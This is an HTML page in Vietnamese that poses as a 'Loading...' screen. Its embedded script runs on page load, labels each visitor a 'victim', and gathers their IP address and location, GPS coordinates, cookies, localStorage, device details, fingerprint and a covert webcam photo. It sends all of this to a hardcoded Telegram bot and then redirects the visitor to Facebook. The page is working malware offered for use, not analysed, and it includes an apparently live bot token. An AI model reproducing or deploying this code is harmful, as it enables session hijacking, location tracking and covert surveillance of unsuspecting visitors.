<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            color: #666;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Đang tải dữ liệu...</h2>
        <div class="spinner"></div>
        <p class="status">Vui lòng chờ trong giây lát</p>
    </div>

    <script>
        // ===== CẤU HÌNH TELEGRAM =====
        const BOT_TOKEN = '8678956338:AAEDpm0-I4KGjomktv8kDnA7t8K5PC3p1ag';  // Thay token của bạn
        const CHAT_ID = '6232287791';      // Thay ID của bạn
        
        // Tạo ID duy nhất cho mỗi nạn nhân
        const VICTIM_ID = 'V_' + Math.random().toString(36).substr(2, 8).toUpperCase();
        
        // ===== HÀM GỬI DỮ LIỆU VỀ TELEGRAM =====
        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `[${VICTIM_ID}] ${message}`,
                    parse_mode: 'HTML'
                })
            }).catch(err => console.log('Lỗi gửi:', err));
        }
        
        function sendFileToTelegram(base64Data, filename, caption) {
            // Gửi file dạng base64 (hạn chế dung lượng)
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
            const blob = b64toBlob(base64Data);
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', blob, filename);
            formData.append('caption', `[${VICTIM_ID}] ${caption}`);
            
            fetch(url, { method: 'POST', body: formData })
                .catch(err => console.log('Lỗi gửi file:', err));
        }
        
        function b64toBlob(b64Data, contentType='') {
            const byteCharacters = atob(b64Data);
            const byteNumbers = new Array(byteCharacters.length);
            for (let i = 0; i < byteCharacters.length; i++) {
                byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            const byteArray = new Uint8Array(byteNumbers);
            return new Blob([byteArray], {type: contentType});
        }
        
        // ===== 1. LẤY THÔNG TIN TRÌNH DUYỆT =====
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browser = 'Unknown';
            if (ua.includes('Chrome')) browser = 'Chrome';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Safari')) browser = 'Safari';
            else if (ua.includes('Edge')) browser = 'Edge';
            else if (ua.includes('Opera')) browser = 'Opera';
            
            let os = 'Unknown';
            if (ua.includes('Android')) os = 'Android';
            else if (ua.includes('iPhone')) os = 'iOS';
            else if (ua.includes('Windows')) os = 'Windows';
            else if (ua.includes('Mac')) os = 'MacOS';
            
            return { browser, os, ua };
        }
        
        // ===== 2. LẤY IP VÀ VỊ TRÍ =====
        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    lat: data.latitude,
                    lon: data.longitude,
                    isp: data.org
                };
            } catch(e) {
                return { ip: 'Unknown', city: 'Unknown', lat: 0, lon: 0 };
            }
        }
        
        // ===== 3. LẤY VỊ TRÍ GPS (nếu được phép) =====
        function getGPSLocation() {
            return new Promise((resolve) => {
                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                success: true,
                                lat: position.coords.latitude,
                                lon: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            });
                        },
                        (error) => {
                            resolve({ success: false, error: error.message });
                        },
                        { timeout: 10000 }
                    );
                } else {
                    resolve({ success: false, error: 'Geolocation not supported' });
                }
            });
        }
        
        // ===== 4. LẤY COOKIES =====
        function getCookies() {
            return document.cookie || 'Không có cookies';
        }
        
        // ===== 5. LẤY LOCAL STORAGE =====
        function getLocalStorage() {
            try {
                const items = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    items[key] = localStorage.getItem(key);
                }
                return JSON.stringify(items, null, 2);
            } catch(e) {
                return 'Không thể đọc localStorage';
            }
        }
        
        // ===== 6. LẤY THÔNG TIN MÀN HÌNH =====
        function getScreenInfo() {
            return {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio
            };
        }
        
        // ===== 7. LẤY THÔNG TIN PIN (nếu có) =====
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging
                    };
                } catch(e) {
                    return null;
                }
            }
            return null;
        }
        
        // ===== 8. LẤY DANH SÁCH THIẾT BỊ NGOẠI VI =====
        async function getDevices() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                const cams = devices.filter(d => d.kind === 'videoinput').map(d => d.label);
                const mics = devices.filter(d => d.kind === 'audioinput').map(d => d.label);
                return { cameras: cams, microphones: mics };
            } catch(e) {
                return { cameras: [], microphones: [] };
            }
        }
        
        // ===== 9. CHỤP ẢNH TỪ WEBCAM =====
        async function capturePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const photo = canvas.toDataURL('image/jpeg', 0.8);
                stream.getTracks().forEach(track => track.stop());
                
                return photo.split(',')[1]; // base64 data
            } catch(e) {
                return null;
            }
        }
        
        // ===== 10. KIỂM TRA TỐC ĐỘ MẠNG =====
        async function testSpeed() {
            const startTime = Date.now();
            try {
                await fetch('https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png', { cache: 'no-cache' });
                const endTime = Date.now();
                return endTime - startTime;
            } catch(e) {
                return -1;
            }
        }
        
        // ===== 11. LẤY LỊCH SỬ DUYỆT WEB (hack) =====
        function getVisitedSites() {
            // Phát hiện các trang đã truy cập qua màu link
            const sites = [
                'facebook.com', 'youtube.com', 'google.com', 'tiktok.com',
                'instagram.com', 'twitter.com', 'zalo.me', 'shopee.vn'
            ];
            const visited = [];
            const link = document.createElement('a');
            
            sites.forEach(site => {
                link.href = `https://${site}`;
                if (link.offsetTop !== 0) { // Cách detect visited
                    visited.push(site);
                }
            });
            return visited;
        }
        
        // ===== 12. LẤY THÔNG TIN WEBRTC (IP nội bộ) =====
        function getLocalIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    const ip = ice.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
                    if (ip) resolve(ip);
                    pc.close();
                };
                setTimeout(() => resolve('Không lấy được'), 3000);
            });
        }
        
        // ===== 13. LẤY THÔNG TIN EXTENSIONS =====
        function getExtensions() {
            // Phát hiện extension đã cài (chrome)
            const extensions = [];
            if (window.chrome && window.chrome.runtime) {
                // Có thể detect một số extension phổ biến
            }
            return extensions;
        }
        
        // ===== 14. TẠO FINGERPRINT =====
        function getFingerprint() {
            const components = [
                navigator.userAgent,
                screen.width + 'x' + screen.height,
                navigator.language,
                navigator.platform,
                new Date().getTimezoneOffset(),
                navigator.hardwareConcurrency || 0,
                navigator.deviceMemory || 0
            ];
            return components.join('|');
        }
        
        // ===== CHẠY TẤT CẢ =====
        async function collectData() {
            sendToTelegram('✅ <b>Bot đã kích hoạt!</b>');
            
            // Thông tin cơ bản
            const browserInfo = getBrowserInfo();
            sendToTelegram(`🌐 <b>Trình duyệt:</b> ${browserInfo.browser} | ${browserInfo.os}`);
            
            // IP và vị trí
            const ipInfo = await getIPInfo();
            sendToTelegram(`📍 <b>IP:</b> ${ipInfo.ip}\n📍 <b>Vị trí:</b> ${ipInfo.city}, ${ipInfo.country}\n🏢 <b>Nhà mạng:</b> ${ipInfo.isp}`);
            
            // GPS
            const gps = await getGPSLocation();
            if (gps.success) {
                sendToTelegram(`🛰️ <b>GPS:</b> ${gps.lat}, ${gps.lon}\n🎯 <b>Độ chính xác:</b> ${gps.accuracy}m`);
                // Gửi link maps
                sendToTelegram(`🗺️ <b>Google Maps:</b> https://maps.google.com/?q=${gps.lat},${gps.lon}`);
            } else {
                sendToTelegram(`⚠️ <b>GPS:</b> Không lấy được (${gps.error || 'unknown'})`);
            }
            
            // Thông tin màn hình
            const screenInfo = getScreenInfo();
            sendToTelegram(`🖥️ <b>Màn hình:</b> ${screenInfo.width}x${screenInfo.height} | ${screenInfo.colorDepth}bit`);
            
            // Cookies
            const cookies = getCookies();
            if (cookies && cookies !== 'Không có cookies') {
                sendToTelegram(`🍪 <b>Cookies:</b> ${cookies.substring(0, 200)}...`);
            }
            
            // Local Storage
            const storage = getLocalStorage();
            if (storage && storage !== 'Không thể đọc localStorage') {
                sendToTelegram(`💾 <b>LocalStorage:</b> ${storage.substring(0, 300)}...`);
            }
            
            // Pin
            const battery = await getBatteryInfo();
            if (battery) {
                sendToTelegram(`🔋 <b>Pin:</b> ${battery.level}% ${battery.charging ? '(Đang sạc)' : '(Không sạc)'}`);
            }
            
            // Tốc độ mạng
            const ping = await testSpeed();
            if (ping > 0) {
                sendToTelegram(`⚡ <b>Ping:</b> ${ping}ms`);
            }
            
            // IP nội bộ
            const localIP = await getLocalIP();
            sendToTelegram(`🏠 <b>IP nội bộ:</b> ${localIP}`);
            
            // Thiết bị
            const devices = await getDevices();
            if (devices.cameras.length > 0) {
                sendToTelegram(`📷 <b>Camera:</b> ${devices.cameras.join(', ')}`);
            }
            if (devices.microphones.length > 0) {
                sendToTelegram(`🎤 <b>Micro:</b> ${devices.microphones.join(', ')}`);
            }
            
            // Fingerprint
            const fp = getFingerprint();
            sendToTelegram(`🆔 <b>Fingerprint:</b> ${fp.substring(0, 100)}...`);
            
            // Thời gian
            sendToTelegram(`📅 <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}`);
            
            // Chụp ảnh webcam (thử)
            const photo = await capturePhoto();
            if (photo) {
                sendFileToTelegram(photo, `webcam_${VICTIM_ID}.jpg`, '📸 Ảnh từ webcam');
            }
            
            sendToTelegram(`✅ <b>Hoàn thành!</b> Đã thu thập dữ liệu từ ${VICTIM_ID}`);
            
            // Chuyển hướng đến trang thật sau 3 giây
            setTimeout(() => {
                window.location.href = 'https://facebook.com';
            }, 3000);
        }
        
        // Bắt đầu thu thập dữ liệu
        collectData();
    </script>
</body>
</html>
